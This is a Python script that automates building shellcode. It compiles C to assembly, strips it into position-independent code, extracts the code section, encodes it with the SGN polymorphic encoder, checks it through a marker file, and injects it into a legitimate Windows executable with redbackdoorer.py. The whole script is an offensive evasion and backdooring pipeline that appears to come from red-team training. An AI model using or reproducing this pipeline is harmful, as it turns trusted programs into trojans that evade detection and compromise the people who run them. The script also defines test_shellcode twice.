import subprocess
import os
import pefile
import time
import shutil

SHC_VERIFY_SLEEP = 0.1

path_cl = r'C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.37.32822\bin\Hostx64\x64\cl.exe'
path_masmshc =  r'C:\Users\hacker\Source\Repos\masm_shc\out\build\x64-Debug\masm_shc\masm_shc.exe'
path_ml64 =  r'C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.37.32822\bin\Hostx64\x64\ml64.exe'

path_runshc = r'C:\Users\hacker\Source\Repos\masm_shc\out\build\x64-Debug\runshc\runshc.exe'
path_shexec = r'C:\Research\hasherezade\exec_fiber\sh-exec-fiber.exe'

verify_filename = r'C:\Temp\a'


def clean_files():
    try:
        os.remove("main.asm")       # generated from compiling source/main.c
        os.remove("main-clean.asm") # cleaned for being a shellcode
        os.remove("main-clean.exe") # assembled
        os.remove("main-clean.bin")
        os.remove("main-clean-append.bin")
        os.remove(verify_filename)
    except OSError:
        pass


def make_c_to_asm(c_file, asm_file, asm_clean_file):
    print("--[ Compile C source to ASM: {} -> {} ]".format(c_file, asm_file))
    subprocess.run([
        path_cl,
        "/c",
        "/FA",
        "/GS-",
        c_file,
    ], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    if not os.path.isfile(asm_file):
        print("Error")
        return
    else:
        print("    > Generated {}".format(asm_file))

    print("--[ Cleanup ASM: {} -> {} ]".format(asm_file, asm_clean_file))
    subprocess.run([
        path_masmshc,
        asm_file,
        asm_clean_file,
    ], check=True, stdout=subprocess.DEVNULL)
    if not os.path.isfile(asm_clean_file):
        print("Error")
        return
    else:
        print("    > Generated {}".format(asm_clean_file))

    print("--[ Fixup ASM: {} ]".format(asm_clean_file))
    fixup_asm_file(asm_clean_file)


def fixup_asm_file(filename):
    with open(filename, 'r') as asmfile:
        lines = asmfile.readlines()

    # replace external reference with shellcode reference
    for idx, line in enumerate(lines): 
        if "dobin" in lines[idx]:
            print("    > Replace external reference at: {}".format(idx))
            lines[idx] = lines[idx].replace(
                "mov	r8, QWORD PTR dobin",
                "lea	r8, [shcstart]"
            )
            
    # add label at end of code
    for idx, line in enumerate(lines): 
        if lines[idx].startswith("END"):
            print("    > Add end of code label at: {}".format(idx))
            lines.insert(idx-1, "shcstart:\r\n")
            lines.insert(idx, "\tnop\r\n")
            break
    
    with open(filename, 'w') as asmfile:
        asmfile.writelines(lines)


def make_shc_from_asm(asm_clean_file, exe_file, shc_file):
    print("--[ Assemble to exe ]")
    subprocess.run([
        path_ml64,
        asm_clean_file,
        "/link",
        "/entry:AlignRSP"
    ], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    if not os.path.isfile(exe_file):
        print("Error")
        return
    else:
        print("    > Generated {}".format(exe_file))

    print("--[ Get code section from exe ]")
    code = get_code_section(exe_file)
    with open(shc_file, 'wb') as f:
        f.write(code)
    print("--[ Shellcode written to: {}  (size: {}) ]".format(exe_file, len(code)))


def get_code_section(pe_file):
    try:
        # Load the PE file
        pe = pefile.PE(pe_file)

        # Iterate over the sections
        for section in pe.sections:
            # Check if this is the code section
            if '.text' in section.Name.decode().rstrip('\x00'):
                data = section.get_data()
                data = remove_trailing_null_bytes(data)
                print("    > Code Size: {}  (raw code section size: {})".format(
                    len(data), section.SizeOfRawData))
                return data
        else:
            print("Code section not found.")
    
    except FileNotFoundError:
        print(f"File not found: {pe_file}")
    except pefile.PEFormatError:
        print(f"Invalid PE file: {pe_file}")


def remove_trailing_null_bytes(data):
    for i in range(len(data) - 1, -1, -1):
        if data[i] != b'\x00'[0]:  # Check for a non-null byte
            return data[:i + 1]
    return b''  # If the entire sequence is null bytes


def test_shellcode(shc_file):
    print("--[ Test it with runshc ]")
    subprocess.run([
        path_runshc,
        shc_file,
    ], check=True)


def obfuscate_shc_loader(file_shc_in, file_shc_out):
    print("--[ Convert with SGN ]")
    path_sgn = r'C:\training\tools\sgn\sgn.exe'
    subprocess.run([
        path_sgn,
        "--arch=64",
        "-i", "{}".format(file_shc_in),
        "-o", "{}".format(file_shc_out),
    ], check=True)
    if not os.path.isfile(file_shc_out):
        print("Error")
        return
    else:
        print("   > Generated main-clean-sgn.bin")


def test_shellcode(shc_name):
    print("---[ Test shellcode: {} ]".format(shc_name))
    subprocess.run([
        path_shexec,
        "{}".format(shc_name),
    ])  # , check=True


def verify_shellcode(shc_name):
    print("---[ Verify shellcode: {} ]".format(shc_name))

    # check if directory exists
    if not os.path.exists(os.path.dirname(verify_filename)):
        print("Error, directory does not exist for: {}".format(verify_filename))
        return

    # path_runshc
    # path_shexec
    subprocess.run([
        path_runshc,
        "{}".format(shc_name),
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)  # , check=True
    time.sleep(SHC_VERIFY_SLEEP)
    if os.path.isfile(verify_filename):
        print("---> OK. Shellcode payload verified (file was created)")
        # better to remove it immediately. If cleanup on start is not performed, 
        # there may be false positives
        os.remove(verify_filename)
    else:
        print("---> FAIL. Payload did not create file.")


def inject_exe(shc_file, exe_in, exe_out):
    print("--[ Injecting: shc {} into: {} -> {} ]".format(
        shc_file, exe_in, exe_out
    ))
    shutil.copyfile(exe_in, exe_out)

    # python3.exe .\redbackdoorer.py 1,1 main-clean-append.bin .\exes\procexp64-a.exe
    subprocess.run([
        "python3.exe",
        "redbackdoorer.py",
        "1,1",
        shc_file,
        exe_out
    ], check=True,  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

